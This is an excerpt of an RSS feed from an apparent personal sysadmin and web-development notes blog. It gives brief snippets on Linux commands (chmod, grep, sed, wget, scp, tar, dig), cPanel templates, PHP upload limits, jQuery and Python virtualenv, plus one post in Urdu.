exec command replaces the shell with given program, in our example, it replaces our shell with bash (with the updated configuration files)
Links  StackOverflow: How do I reload .</description>
    </item>
    
    <item>
      <title>[SimpleHTTPServer] Python HTTP server</title>
      <link>/post/_commands/simplehttpserver-python-http-server/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/simplehttpserver-python-http-server/</guid>
      <description> Run an HTTP server from any directory
python -m SimpleHTTPServer 8000  FYI, PHP also comes with a built-in server
php -S localhost:8080 -t ./public/  Links  StackExchange http://www.slimframework.com/docs/start/web-servers.html  </description>
    </item>
    
    <item>
      <title>[apt] Packages</title>
      <link>/post/_commands/apt-packages/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/apt-packages/</guid>
      <description>To get a list of packages installed locally do this in your terminal:
dpkg --get-selections | grep -v deinstall  (The -v tag &amp;ldquo;inverts&amp;rdquo; grep to return non-matching lines)
To get a list of a specific package installed:
dpkg --get-selections | grep postgres  To save that list to a text file called packages on your desktop do this in your terminal:
dpkg --get-selections | grep -v deinstall &amp;gt; ~/Desktop/packages  Alternatively, simply use</description>
    </item>
    
    <item>
      <title>[chmod] Permissions</title>
      <link>/post/_commands/chmod-permission/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/chmod-permission/</guid>
      <description>change permissions on all dirs find . -type d -exec chmod 700 {} \;  change permissions on all files find . -type f -exec chmod 600 {} \;  change permissions recursively use the -R flag
chmod 755 -R var/  make executable chmod +x file  copy permissions from another file On GNU/Linux chown and chmod have a --reference option
chown --reference=otherfile thisfile chmod --reference=otherfile thisfile  Example from Magento Enter the following commands to set permissions:</description>
    </item>
    
    <item>
      <title>[crontab] List &amp; Edit crontab entries</title>
      <link>/post/_commands/crontab-list--edit-crontab-entries/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/crontab-list--edit-crontab-entries/</guid>
      <description> List crontab entries crontab -l  Edit a crontab crontab -e  Edit root user’s crontab sudo crontab -e  Links  List / Display all cron jobs  </description>
    </item>
    
    <item>
      <title>[curl] Get IP address (external) using URL endpoints</title>
      <link>/post/_commands/curl-get-ip-address-external-using-url-endpoints/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/curl-get-ip-address-external-using-url-endpoints/</guid>
      <description>external IP using dig dig +short myip.opendns.com @resolver1.opendns.com  This asks the IP address of myip.opendns.com from the name server resolver1.opendns.com (something you trust), which will return your external IP address.
curl works over HTTP, and therefore less efficient than the direct DNS query with dig.
external IP using curl You can curl an endpoint for your external public IP, like so:
curl http://ipecho.net/plain; echo  There are plenty of services that give you your public IP address by going to a URL.</description>
    </item>
    
    <item>
      <title>[df] Disk Free</title>
      <link>/post/_commands/df-disk-free/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/df-disk-free/</guid>
      <description>df -h  The -h flag is for human readable output, show 30G instead of 30830588.
Summing numbers in the output of df We can do that by pip the output of the df command to something like awk and have awk sum up the numbers, like so:
df -lP | awk &#39;{}&#39; df -lP | awk &#39;{do math} END {print result}&#39;  If the device names are long, df splits the output on multiple line to fit it in the normal 80 character long terminal.</description>
    </item>
    
    <item>
      <title>[dig, whois] Domain records</title>
      <link>/post/_commands/dig-whois-domain-records/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/dig-whois-domain-records/</guid>
      <description>Registration details whois domain.com will return domain registration details for domain.com, including when it was registered, who registered it, when it was created and who is the contact.
dig is another useful command. You can use the dig +short to only list values.
Name Servers whois aamnah.com | grep -i --color &amp;quot;Name Server:&amp;quot;  OR
dig NS aamnah.com  NS, TXT, MX, SOA, SPF records You can either pass the record as an argument</description>
    </item>
    
    <item>
      <title>[find] Find and Delete files</title>
      <link>/post/_commands/find-find-and-delete-files/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/find-find-and-delete-files/</guid>
      <description>Delete files found:
find . -type f -name FILENAME -exec rm -rf {} \;  For example
find . -type f -name .DS_Store -exec rm -rf {} \;  </description>
    </item>
    
    <item>
      <title>[gcp --parents] Copy selected files and recreate folder structure</title>
      <link>/post/_commands/gcp---parentscopy-selected-file-and-recreate-folders/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/gcp---parentscopy-selected-file-and-recreate-folders/</guid>
      <description>Why? Makes it easier to copy a default OpenCart extension. Find the files by name and copy them while also creating the required folder structure.
How Use the cp command with --parents flag.
cp --parents admin/controller/extension/payment/bank_transfer.php easypaisa/  Won&amp;rsquo;t work on macOS by default, so brew install coreutils first and then use gcp instead of cp
gcp --parents admin/controller/extension/payment/bank_transfer.php easypaisa/  easypaisa └── admin └── controller └── extension └── payment └── bank_transfer.</description>
    </item>
    
    <item>
      <title>[grep, egrep, fgrep] Search files based on patterns</title>
      <link>/post/_commands/grep-egrep-fgrep-search-files-based-on-patterns/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/grep-egrep-fgrep-search-files-based-on-patterns/</guid>
      <description>grep grep matches patterns. it uses regex to match patterns
grep expression file  Example
grep hello helloworld.txt  will searhc for hello in the file helloworld.txt
^ ^ matches all the lines that begin with hello. ^ goes at the beginning of the search expression.
grep ^hello helloworld.txt  $ $ will give you all the lines that end with your search expression. $ goes at the end of the search expression.</description>
    </item>
    
    <item>
      <title>[grep, sed] Find and Replace string in multiple files</title>
      <link>/post/_commands/grep-sed-find-and-replace-string-in-multiple-files/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/grep-sed-find-and-replace-string-in-multiple-files/</guid>
      <description>grep -rl --null mangoes/ . | xargs -0 sed -i &#39;&#39; &#39;s/mangoes/oranges/g&#39;  why? Here&amp;rsquo;s the scenario, i exported some files for this blog from a software that used a different image folder structure. Lots of new files with different links. So i needed a way to
 find all the files spanning multiple directories containing a specific string edit (in place) all them files found in multiple directories and replace it with new string  Basically, what i needed to do was change the path for images directory from resources/file.</description>
    </item>
    
    <item>
      <title>[grep] Find and Delete files based on string</title>
      <link>/post/_commands/grep-find-and-delete-files-based-on-string/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/grep-find-and-delete-files-based-on-string/</guid>
      <description>grep -lZrw xxx-hacker /home/theitali/ | xargs -0 rm -f --  where xxx-hacker is your string and /home/theitali/ is your location.
 l lists the file name Z is required for the xargs -0 part r is for recursive, try -R if small r doesnt work. w is for searching the whole word  </description>
    </item>
    
    <item>
      <title>[ifconfig] Get IP address of your machine (internal &amp; external)</title>
      <link>/post/_commands/ifconfig-get-ip-address-internal/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/ifconfig-get-ip-address-internal/</guid>
      <description>NOTE: Much simpler is hostname -I or hostname --all-ip-addresses which gives you all addresses for the host, IPV4s as well as IPV6s. Check hostname -h for more nifty details  ifconfig is for configuring a network interface. (Interface Configuration)
Get IP by interface (eth, wlan, lo etc) ifconfig $1 | grep &amp;quot;inet addr&amp;quot; | awk -F: &#39;{print $2}&#39; | awk &#39;{print $1}&#39;  grep prints lines mathcing a pattern awk is a pattern scanning and processing language.</description>
    </item>
    
    <item>
      <title>[last] Find out login details</title>
      <link>/post/_commands/last-find-out-login-details/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/last-find-out-login-details/</guid>
      <description>We can use the last command to find out who logged in to our computer, when, and in some cases over the network, where (IP addresses). You can also see if the are still logged in.
last on an Ubuntu system (vortex) last on an Linux Academy lab server last on Mac OS X El Capitan </description>
    </item>
    
    <item>
      <title>[modprobe, lsmod, insmod, rmmod] List, Add, Remove Kernel Modules</title>
      <link>/post/_linux/modprobe-lsmod-insmod-rmmod-list-add-remove-kernel-modules/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/modprobe-lsmod-insmod-rmmod-list-add-remove-kernel-modules/</guid>
      <description>Building on previous lessons in this section, we will learn how to probe our kernel with the appropriate device driver and determine whether it is loaded and functioning as expected. We will also discuss how we can use the configuration of modprobe to blacklist or prevent some device drivers from loading even if the hardware is present on our system as well as why we might need to do that.</description>
    </item>
    
    <item>
      <title>[scp] Secure Copy</title>
      <link>/post/_commands/scp-secure-copy/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/scp-secure-copy/</guid>
      <description>Basic syntax is this:
scp fileToCopy user@remoteServer:Location  SCP using port number: use the -P (capital P) flag for port. -p (small p) is reserved for rsync time.
 scp -P 2200 /file-to-copy user@server.com:/location-to-copy-to  Passing an authentication key: scp -P 2200 -i ~/.ssh/rsa_key /file-to-copy user@server.com:/location-to-copy-to  If you have saved ssh keys already and there is only one key for the server you are copying to, scp much like ssh will automatically pick up the key and you will not have to pass the -i argument.</description>
    </item>
    
    <item>
      <title>[tar] Compressed Archives</title>
      <link>/post/_commands/tar-compressed-archives/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/tar-compressed-archives/</guid>
      <description>tar creates a compressed archive. the file extension of the resulting archive is .tar and the tar archives are called tarballs..
 GNU ‘tar’ saves many files together into a single tape or disk archive, and can restore individual files from the archive.
 A .tar file is an archive, but it&amp;rsquo;s not compressed. .tar.gz is a an archive that is compressed.
Flags  c is for create, &amp;ndash;create a new archive v is for &amp;ndash;verbose, verbosely list files processed, list out files as they are added to the archive f is for &amp;ndash;file=ARCHIVE, use archive file or device ARCHIVE, basically, specify the tar file that you wanna create.</description>
    </item>
    
    <item>
      <title>[wget, grep, nano, ps, ssh] Top 5 Commands</title>
      <link>/post/_commands/wget-grep-nano-ps-ssh-top-5-commands/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/wget-grep-nano-ps-ssh-top-5-commands/</guid>
      <description>Source: [Youtube] Nixie Pixel: Top 5 Command Line Essentials - BASH Basics
5. wget download files wget -O filename http://url.com  -O is for --output-document. This flag let&amp;rsquo;s you specify the file to which save in/as. an output document
-O file --output-document=file   Use of -O is not intended to mean simply &amp;ldquo;use the name file instead of the one in the URL;&amp;rdquo; rather, it is analogous to shell redirection: wget -O file http://foo is intended to work like wget -O - http://foo &amp;gt; file; file will be truncated immediately, and all downloaded content will be written there.</description>
    </item>
    
    <item>
      <title>[wget] How to store an entire website offline</title>
      <link>/post/_commands/wget-getwebsite---download-an-entire-website-offline/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_commands/wget-getwebsite---download-an-entire-website-offline/</guid>
      <description>wget --random-wait -r -p -e robots=off -U mozilla http://yoursite.com  OR, as a bash function added to ~/.bash_profile (MacOS) or ~/.bashrc (Linux)
# Download an entire website # -p --page-requisites: get all the elements that compose the page (images, CSS and so on) # -e robots=off you don&#39;t want wget to obey by the robots.txt file # -U mozilla as your browsers identity. # --random-wait to let wget chose a random number of seconds to wait, avoid get into black list.</description>
    </item>
    
    <item>
      <title>cPanel Web Templates and Skeleton Directory</title>
      <link>/post/_sysadmin/edit-cpanel-skel-webtemplates/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_sysadmin/edit-cpanel-skel-webtemplates/</guid>
      <description>Web Templates /var/cpanel/webtemplates/user/english/  Web templates are default template .tmpl files that are shown for status pages.
 Default Website Page (Has not yet been configured by the domain owner) Account Move (Has moved) Account Suspended (Has been suspended) Connection Selection (Is experiencing a connection or firewall problem)  The files to edit are:
/var/cpanel/webtemplates/user/english/default.tmpl /var/cpanel/webtemplates/root/english/moving.tmpl /var/cpanel/webtemplates/root/english/redirect.tmpl /var/cpanel/webtemplates/user/english/suspended.tmpl  Web Templates can also be edited via WHM &amp;gt; Account Functions &amp;gt; Web Template Editor</description>
    </item>
    
    <item>
      <title>fileconveyer</title>
      <link>/post/_misc/2014-05-21-fileconveyer/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_misc/2014-05-21-fileconveyer/</guid>
      <description>Install FileConveyer: Change to the directory you want to hold the fileconveyor files, then run:
sudo apt install git python-setuptools &amp;amp;&amp;amp; sudo easy_install pip &amp;amp;&amp;amp; sudo pip install -e git+https://github.com/wimleers/fileconveyor@master#egg=fileconveyor  sudo nano src/fileconveyor/fileconveyor/config.xml  &amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt; &amp;lt;config&amp;gt; &amp;lt;!-- Sources --&amp;gt; &amp;lt;sources ignoredDirs=&amp;quot;&amp;quot;&amp;gt; &amp;lt;source name=&amp;quot;test&amp;quot; scanPath=&amp;quot;/var/www/html/test&amp;quot; /&amp;gt; &amp;lt;/sources&amp;gt; &amp;lt;!-- Servers --&amp;gt; &amp;lt;servers&amp;gt; &amp;lt;server name=&amp;quot;Rackspace Cloud Files&amp;quot; transporter=&amp;quot;cloudfiles&amp;quot;&amp;gt; &amp;lt;username&amp;gt;USERNAME&amp;lt;/username&amp;gt; &amp;lt;api_key&amp;gt;APIKEY&amp;lt;/api_key&amp;gt; &amp;lt;container&amp;gt;CONTAINER&amp;lt;/container&amp;gt; &amp;lt;/server&amp;gt; &amp;lt;/servers&amp;gt; &amp;lt;!-- Rules --&amp;gt; &amp;lt;rules&amp;gt; &amp;lt;rule for=&amp;quot;test&amp;quot; label=&amp;quot;Test&amp;quot;&amp;gt; &amp;lt;destinations&amp;gt; &amp;lt;destination server=&amp;quot;Rackspace Cloud Files&amp;quot; path=&amp;quot;test&amp;quot; /&amp;gt; &amp;lt;/destinations&amp;gt; &amp;lt;/rule&amp;gt; &amp;lt;/rules&amp;gt; &amp;lt;/config&amp;gt;  Add this to /etc/rc.</description>
    </item>
    
    <item>
      <title>increasing file size for PHPMyAdmin uploads</title>
      <link>/post/_php/increase-filesize-phpmyadmin-upload/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_php/increase-filesize-phpmyadmin-upload/</guid>
      <description>Issue:
 I cannot upload big dump files (memory, HTTP or timeout problems). Can not import a database (Max: 2,048KiB)  nano /etc/php5/apache2/php.ini # PHP5 nano /etc/php/7.0/apache2/php.ini # PHP7  post_max_size = 128M memory_limit = 128M upload_max_filesize = 64M # this is what corresponds with the file upload size in phpMyAdmin  Tip: Use ctrl+W to look for these settings.
service apache2 reload  http://docs.phpmyadmin.net/en/latest/faq.html#faq1-16</description>
    </item>
    
    <item>
      <title>jQuery and AJAX</title>
      <link>/post/_javascript/ajax-jquery-and-ajax/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/ajax-jquery-and-ajax/</guid>
      <description> the difference between jQuery&amp;rsquo;s .load() AJAX method and jQuery&amp;rsquo;s other shorthand AJAX methods? The .load() method must be chained onto a jQuery selection. For example,
{% highlight javascript %} $(&#39;#element&#39;).load(&#39;page.html&#39;); {% endhighlight %}  .get() {% highlight javascript %} $.get(url, data, callback); {% endhighlight %}  </description>
    </item>
    
    <item>
      <title>jQuery vs. JavaScript</title>
      <link>/post/_javascript/2014-09-04-jquery/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/2014-09-04-jquery/</guid>
      <description>jquery = $
jquery.load(&#39;text.html&#39;) is the same as $.load(&#39;text.html&#39;)
Selecting an element by id Javascript:
{% highlight javascript %} document.getElementById(&#39;#jumbo&#39;) {% endhighlight %}  jQuery:
{% highlight javascript %} $(&#39;#jumbo&#39;) {% endhighlight %}  Hiding an element Javascript:
{% highlight javascript %} document.getElementById(&#39;#load&#39;).style.display = &#39;none&#39;; {% endhighlight %}  jQuery:
{% highlight javascript %} $(&#39;#load&#39;).hide(); {% endhighlight %}  Inserting HTML Javascript:
{% highlight javascript %} var text = &amp;quot;hello there!</description>
    </item>
    
    <item>
      <title>syntax highlighting colors</title>
      <link>/post/_jekyll/2017-02-25-test-syntax-highlighting-theme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_jekyll/2017-02-25-test-syntax-highlighting-theme/</guid>
      <description>/* ********************************************** Begin prism-core.js ********************************************** */ var _self = (typeof window !== &#39;undefined&#39;) ? window // if in browser : ( (typeof WorkerGlobalScope !== &#39;undefined&#39; &amp;amp;&amp;amp; self instanceof WorkerGlobalScope) ? self // if in worker : {} // if in node js ); /** * Prism: Lightweight, robust, elegant syntax highlighting * MIT license http://www.opensource.org/licenses/mit-license.php/ * @author Lea Verou http://lea.verou.me */ var Prism = (function(){ // Private helper vars var lang = /\blang(?</description>
    </item>
    
    <item>
      <title>virtualenv</title>
      <link>/post/_python/2014-08-29-virtualenv/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_python/2014-08-29-virtualenv/</guid>
      <description>Why use virtualenv?  it lets you use a newer version of python () instead of using the system default (2.7.5 on Mac), without effecting the default. It is recommeneded that you start using Python 3 but at the same time it is not really all that feasible yet for several project. For example, Django still is not Python 3 ready. Virtualenv lets you work in different version of python at the same time.</description>
    </item>
    
    <item>
      <title>virtualenvwrapper</title>
      <link>/post/_python/2014-08-29-virtualenvwrapper/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_python/2014-08-29-virtualenvwrapper/</guid>
      <description>Docs
Features  Organizes all of your virtual environments in one place. Wrappers for managing your virtual environments (create, delete, copy). Use a single command to switch between environments. Tab completion for commands that take a virtual environment as argument. User-configurable hooks for all operations (see Per-User Customization). 6.Plugin system for more creating sharable extensions (see Extending Virtualenvwrapper).  install:
{% highlight bash %} pip install virtualenvwrapper {% endhighlight %}  setting up: We need to specify the directory that&amp;rsquo;ll be the home of all of our virtual environments.</description>
    </item>
    
    <item>
      <title>web scraping</title>
      <link>/post/_python/2014-08-18-web-scraping/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_python/2014-08-18-web-scraping/</guid>
      <description> Links  Coding for Entrepreneurs video about web scraping with Python Web Scraping for Sales &amp;amp; Growth Hacking Data mining and Scraping for Beginners and Pros  </description>
    </item>
    
    <item>
      <title>آؤ اردو میں تحریر کریں</title>
      <link>/post/_misc/2014-08-26-lets_write_in_urdu/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_misc/2014-08-26-lets_write_in_urdu/</guid>
      <description>مجھے ہمیشہ سے مختلف زبانیں سیکھنے اور بولنے کا شوق رہا ہے۔ اس وقت میں روانی کے ساتھ تین زبانیں بول سکتی ہوں۔۔ اردو ،انگریزی اور پنجابی۔ اس کے علاوہ میں ان دنوں عربی اور فرانسیسی سیکھ رہی ہوں۔
عربی اور فرانسیسی آن لائن سیکھنے کے لئے عربی اور فرانسیسی ٹائپ کرنا بھی ضروری ہے۔ اور اسکے لئے آپ کو الگ سے کیبورڈ لےآؤٹ* انسٹال کرنا پڑتا ہے۔ جیسے ہی میں نے یہ کام کرنا سیکھا میرا اگلا قدم اردو لے آؤٹ انسٹال کرنا تھا۔ اور اس دن سے ہی میں روز کچھ نا کچھ اردو میں ٹائپ کرتی ہوں تاکہ میری اردو میں ٹائپ کرنے کی رفتار اور حروف کی پہچان بہتر ہو سکے۔</description>
    </item>
    
  </channel>
</rss>